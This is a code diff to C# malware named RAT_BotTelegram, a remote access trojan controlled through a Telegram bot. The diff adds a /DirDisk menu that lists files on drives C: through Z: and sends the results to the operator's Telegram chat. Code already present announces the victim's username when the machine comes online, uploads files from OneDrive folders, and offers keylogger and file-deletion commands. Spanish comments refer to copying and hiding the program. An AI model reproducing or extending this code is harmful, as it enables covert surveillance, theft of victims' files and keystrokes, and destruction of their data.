@@ -18,10 +18,19 @@ namespace RAT_BotTelegram {
         private static readonly TelegramBotClient Bot = new TelegramBotClient(config.TOKEN);
 
 
+        public static string Path { get; set; }
+
+        //public void SetBuffer(string texto){
+        //    PathCommands = texto;
+        //}
+        //public string GetBuffer() {
+        //    return PathCommands;
+        //}
 
         // Debes escribir el ID, para que el bot solo te responda a tí.
         static void Main(string[] args) {
 
+            
             // Copiar
             // Esconder
             // Iniciar script
@@ -42,7 +51,8 @@ namespace RAT_BotTelegram {
 
             // Mensaje de conexión
 
-            Bot.SendTextMessageAsync(config.ID, " ==>>    <b>Computer:</b> " + Features.getUserName() + " <b>is online</b>    <<== ",ParseMode.Html);
+            //Bot.SendTextMessageAsync(config.ID, " ==>>    <b>Computer:</b> " + Features.getUserName() + " <b>is online</b>    <<== ",ParseMode.Html);
+            Bot.SendTextMessageAsync(config.ID, " ==>>    Computer: " + Features.getUserName() + " is online    <<== ");
 
             //Bot.SendVideoAsync(config.ID, File.Open(@"F:\New folder (2)\40.3gp",FileMode.Open),999,999,999,"info",ParseMode.Default,false,false);
 
@@ -53,13 +63,20 @@ namespace RAT_BotTelegram {
             Bot.StopReceiving();
         }
 
+
+        private static async void ListarFiles(string Path) {
+            foreach (var file in Tools.GetFile(Path)) {
+                string FData = infoFile(file);
+                await Bot.SendTextMessageAsync(config.ID, "" + FData, ParseMode.Html);
+            }
+        }
         private static async void BotOnMessageReceived(object sender, MessageEventArgs messageEventArgs) {
             var message = messageEventArgs.Message;
 
             if (message == null || message.Type != MessageType.Text) return;
 
             string Command = message.Text.Split(' ').First();           // Case "Comando"
-            string Path = message.Text.Substring(Command.Length);       // Obtiene el subcomando
+            Path = message.Text.Substring(Command.Length);       // Obtiene el subcomando
 
 
             switch (message.Text.Split(' ').First()) {
@@ -113,29 +130,60 @@ namespace RAT_BotTelegram {
                 // await Bot.SendTextMessageAsync(config.ID, "NOTE: The process of obtaining files can take many minutes per file. \n[Depends on the upload speed of the computer]");
 
                 case "/Dir":
-                    // Verificar Path
+                    ListarFiles(Path);
+                    Path = "";
+                    break;
+                case "/DirDisk":
+                    var Disk = new InlineKeyboardMarkup(new[]{
+                    new[]{
+                        InlineKeyboardButton.WithCallbackData(text: "List Disk C:\\"       ,callbackData: "DDC"),
+                        InlineKeyboardButton.WithCallbackData(text: "List Disk D:\\"       ,callbackData: "DDD"),
+                        InlineKeyboardButton.WithCallbackData(text: "List Disk E:\\"       ,callbackData: "DDE"),
+                    },new[]{                                                                               
+                        InlineKeyboardButton.WithCallbackData(text: "List Disk F:\\"       ,callbackData: "DDF"),
+                        InlineKeyboardButton.WithCallbackData(text: "List Disk G:\\"       ,callbackData: "DDG"),
+                        InlineKeyboardButton.WithCallbackData(text: "List Disk H:\\"       ,callbackData: "DDH"),
+                    },new[]{                                                                               
+                        InlineKeyboardButton.WithCallbackData(text: "List Disk I:\\"       ,callbackData: "DDI"),
+                        InlineKeyboardButton.WithCallbackData(text: "List Disk J:\\"       ,callbackData: "DDJ"),
+                        InlineKeyboardButton.WithCallbackData(text: "List Disk K:\\"       ,callbackData: "DDK"),
+                    },new[]{                                                                               
+                        InlineKeyboardButton.WithCallbackData(text: "List Disk L:\\"       ,callbackData: "DDL"),
+                        InlineKeyboardButton.WithCallbackData(text: "List Disk M:\\"       ,callbackData: "DDM"),
+                        InlineKeyboardButton.WithCallbackData(text: "List Disk N:\\"       ,callbackData: "DDN"),
+                    },new[]{                                                                               
+                        InlineKeyboardButton.WithCallbackData(text: "List Disk O:\\"       ,callbackData: "DDO"),
+                        InlineKeyboardButton.WithCallbackData(text: "List Disk P:\\"       ,callbackData: "DDP"),
+                        InlineKeyboardButton.WithCallbackData(text: "List Disk Q:\\"       ,callbackData: "DDQ"),
+                    },new[]{                                                                               
+                        InlineKeyboardButton.WithCallbackData(text: "List Disk R:\\"       ,callbackData: "DDR"),
+                        InlineKeyboardButton.WithCallbackData(text: "List Disk S:\\"       ,callbackData: "DDS"),
+                        InlineKeyboardButton.WithCallbackData(text: "List Disk T:\\"       ,callbackData: "DDT"),
+                    },new[]{                                                                               
+                        InlineKeyboardButton.WithCallbackData(text: "List Disk U:\\"       ,callbackData: "DDU"),
+                        InlineKeyboardButton.WithCallbackData(text: "List Disk V:\\"       ,callbackData: "DDV"),
+                        InlineKeyboardButton.WithCallbackData(text: "List Disk W:\\"       ,callbackData: "DDW"),
+                    },new[]{                                                                               
+                        InlineKeyboardButton.WithCallbackData(text: "List Disk X:\\"       ,callbackData: "DDX"),
+                        InlineKeyboardButton.WithCallbackData(text: "List Disk Z:\\"       ,callbackData: "DDZ"),
+                        
+                    }});
+                    await Bot.SendTextMessageAsync(config.ID, "list files from disk? " , replyMarkup: Disk);        // Obtiene USER
 
-                    foreach (var file in Tools.GetFile(Path)) {
-
-                        string FData = infoFile(file);
-
-                        await Bot.SendTextMessageAsync(config.ID, "" + FData,ParseMode.Html);
-
-                    }
                     break;
 
 
 
-                case "/Hola":
+                //case "/Hola":
 
-                    foreach (var file in Tools.GetFile(Path)) {
-                        await Bot.SendTextMessageAsync(config.ID, "" + file);
-                    }
+                //    foreach (var file in Tools.GetFile(Path)) {
+                //        await Bot.SendTextMessageAsync(config.ID, "" + file);
+                //    }
 
-                    await Bot.SendTextMessageAsync(config.ID, "El texto completo fue:" + message.Text + "\n\nInicio: " + Command.Length + "\nFinal:" + message.Text.Length);
-                    await Bot.SendTextMessageAsync(config.ID, "\n" + message.Text.Substring(Command.Length));
+                //    await Bot.SendTextMessageAsync(config.ID, "El texto completo fue:" + message.Text + "\n\nInicio: " + Command.Length + "\nFinal:" + message.Text.Length);
+                //    await Bot.SendTextMessageAsync(config.ID, "\n" + message.Text.Substring(Command.Length));
 
-                    break;
+                //    break;
 
                 case "/botones":
 
@@ -156,6 +204,7 @@ namespace RAT_BotTelegram {
                   "\n/Get_Files            |Menu| <Get Files from Computer>" +  // Obtiene los archivos dentro de la computadora
                   "\n/Get_DirFiles      |Menu| <Get list of file names>" +   // Obtiene los nombres dentro de la computadora
                   "\n/Dir     <Path>       /Dir C:\\User\\Photos and videos" +  // Lista los archivos de la carpeta y las subscarpetas.
+                  "\n/DirDisk  <Path>       |Menu| ListDisk" +  // Lista los archivos de la carpeta y las subscarpetas.
                   "\n/Keylogger          |Menu| <keylogger Options >" +
                   "\n/DeleteFile <Path>" +
                   "\n/DeleteFolder <Path>" +
@@ -167,7 +216,6 @@ namespace RAT_BotTelegram {
             }
         }
         private static string infoFile(string file) {  // Muestra información detallada del archivo
-
             FileInfo fil = new FileInfo(file);
             string FData =
                 "\n<b>Name =</b> " + fil.Name +
@@ -392,8 +440,46 @@ namespace RAT_BotTelegram {
                 case "GetVideosO":    GetFilesTelegram(@"C:\Users\" + user + @"\OneDrive\Videos"); break;                         
                 case "GetDocumentO":  GetFilesTelegram(@"C:\Users\" + user + @"\OneDrive\Documents"); break;                         
                 case "GetMusicO":     GetFilesTelegram(@"C:\Users\" + user + @"\OneDrive\Música"); break;                         
-                case "GetDesktopO":   GetFilesTelegram(@"C:\Users\" + user + @"\OneDrive\Escritorio");break;                          
-                // Other
+                case "GetDesktopO":   GetFilesTelegram(@"C:\Users\" + user + @"\OneDrive\Escritorio");break;
+
+                // "/DirDisk"
+                case "DDC":    ListarFiles(@"C:\");    break;
+                case "DDD":    ListarFiles(@"D:\");    break;
+                case "DDE":    ListarFiles(@"E:\");    break;
+                case "DDF":    ListarFiles(@"F:\");    break;
+                case "DDG":    ListarFiles(@"G:\");    break;
+                case "DDH":    ListarFiles(@"H:\");    break;
+                case "DDI":    ListarFiles(@"I:\");    break;
+                case "DDJ":    ListarFiles(@"J:\");    break;
+                case "DDK":    ListarFiles(@"K:\");    break;
+                case "DDL":    ListarFiles(@"L:\");    break;
+                case "DDM":    ListarFiles(@"M:\");    break;
+                case "DDN":    ListarFiles(@"N:\");    break;
+                case "DDO":    ListarFiles(@"O:\");    break;
+                case "DDP":    ListarFiles(@"P:\");    break;
+                case "DDQ":    ListarFiles(@"Q:\");    break;
+                case "DDR":    ListarFiles(@"R:\");    break;
+                case "DDS":    ListarFiles(@"S:\");    break;
+                case "DDT":    ListarFiles(@"T:\");    break;
+                case "DDU":    ListarFiles(@"U:\");    break;
+                case "DDV":    ListarFiles(@"V:\");    break;
+                case "DDW":    ListarFiles(@"W:\");    break;
+                case "DDX":    ListarFiles(@"X:\");    break;
+                case "DDZ":    ListarFiles(@"Z:\"); break;
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
